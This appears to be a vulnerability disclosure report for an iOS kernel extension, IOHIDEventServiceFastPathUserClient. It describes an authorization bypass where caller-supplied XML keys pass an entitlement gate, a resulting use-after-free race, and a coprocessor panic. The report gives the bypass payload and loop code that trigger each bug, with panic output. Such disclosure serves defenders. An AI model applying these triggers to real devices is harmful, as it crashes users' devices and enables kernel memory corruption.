@@ -1,0 +1,113 @@
+IOHIDEventServiceFastPathUserClient — UAF and AOP Panic via Authorization Bypass
+
+
+Summary
+-------
+IOHIDEventServiceFastPathUserClient (IOHIDFamily kext) contains two bugs
+reachable from a normal sandboxed app with no entitlements required.
+
+1. Use-after-free via authorization bypass (CWE-416, CWE-863): The selector 0
+   (open) gate checks for FastPathHasEntitlement and
+   FastPathMotionEventEntitlement in the caller-supplied OSDictionary instead
+   of the actual entitlement flags recorded during initWithTask. Any sandboxed
+   app can pass the gate by supplying those keys in the input XML. Once past
+   the gate, closeForClient (called from didTerminate on the IOKit termination
+   thread) frees objects in the provider's client collection without holding
+   any lock, while openForClient runs on the work loop under the command gate
+   and iterates the same collection via safeMetaCast. The command gate does
+   not exclude the termination thread, so openForClient can dereference an
+   object already freed by closeForClient. On MTE-enabled devices (A17+) this
+   produces a synchronous tag check fault. On non-MTE devices the freed memory
+   may be reallocated, making this a controllable UAF.
+
+2. AOP coprocessor panic: The same authorization bypass allows any sandboxed
+   app to rapidly open and destroy large numbers of gated connections,
+   saturating the SPU-backed provider's outbox. Sustained message bursts
+   trigger an OUTBOX3 assertion failure in the AOP firmware, crashing the
+   coprocessor and taking down the device.
+
+
+Steps to reproduce
+------------------
+Bug 1 (UAF):
+1. Build and install UAFPoc onto a device running iOS 26.3.
+2. Launch the app.
+3. Tap the Trigger button. The device will kernel panic and reboot.
+
+Bug 2 (AOP panic):
+1. Build and install AOPPanicPoc onto a device running iOS 26.3.
+2. Launch the app.
+3. Tap the Trigger button. The device will kernel panic and reboot.
+
+
+Expected results
+----------------
+Bug 1: The selector 0 gate validates entitlement flags from initWithTask
+rather than caller-supplied input. Connection teardown and concurrent open
+are mutually exclusive under a consistent lock, preventing any thread from
+reading a freed object.
+
+Bug 2: The kernel throttles or rejects connection requests that would
+overwhelm an SPU-backed provider's outbox rather than allowing userspace to
+trigger an AOP firmware assertion.
+
+
+Actual results
+--------------
+Bug 1 — UAF:
+
+    // Auth bypass: any sandboxed app passes the gate with this XML
+    <dict>
+        <key>FastPathHasEntitlement</key><true/>
+        <key>FastPathMotionEventEntitlement</key><true/>
+    </dict>
+
+    // Race: opener threads + rapid probe teardown
+    // Opener threads (x3): tight close -> reopen loop on persistent connections
+    while (!stop) {
+        IOConnectCallMethod(conn, 1, ...);  // sel1: close, clears +0x109, no lock
+        IOConnectCallMethod(conn, 0, ...);  // sel0: open, openForClient iterates
+                                            //   provider client collection via
+                                            //   safeMetaCast (command gate held)
+    }
+
+    // Main thread: batch-gate 16 probes then destroy them all
+    while (!stop) {
+        for (int i = 0; i < 16; i++) {
+            IOServiceOpen(service, mach_task_self(), 2, &probes[i]);
+            IOConnectCallMethod(probes[i], 0, ..., xml);  // gate
+        }
+        for (int i = 0; i < 16; i++)
+            mach_port_destruct(mach_task_self(), probes[i], 0, 0);
+            // -> clientClose -> terminate() [async]
+            // -> didTerminate -> closeForClient (NO lock)
+            // -> frees objects in provider client collection
+            //    while opener threads read the same collection
+        usleep(80000);
+    }
+
+    // Result: openForClient dereferences freed object
+    //   safeMetaCast+0x1c: LDR X16, [X0]  <- UAF
+    //   A19 Pro (MTE): synchronous tag check fault
+    //   A10X (no MTE): kernel data abort
+
+Bug 2 — AOP panic:
+
+    // Same auth bypass, same teardown loop
+    // Rapid creation and destruction of gated connections saturates
+    // the SPU-backed provider's OUTBOX3 message queue
+    while (!stop) {
+        for (int i = 0; i < 16; i++) {
+            IOServiceOpen(service, mach_task_self(), 2, &probes[i]);
+            IOConnectCallMethod(probes[i], 0, ..., xml);  // gate -> SPU message
+        }
+        for (int i = 0; i < 16; i++)
+            mach_port_destroy(mach_task_self(), probes[i]);  // teardown -> SPU message
+        usleep(80000);
+    }
+
+    // Result: AOP firmware assertion
+    //   [EndpointAdapter.cpp:238] assert: OUTBOX3 not ready
+
+Confirmed on: iPhone 17 Pro Max (A19 Pro, iOS 26.3 23D127),
+              iPad Pro 12.9in 2nd gen (A10X, iOS 17.7.10 21H560).
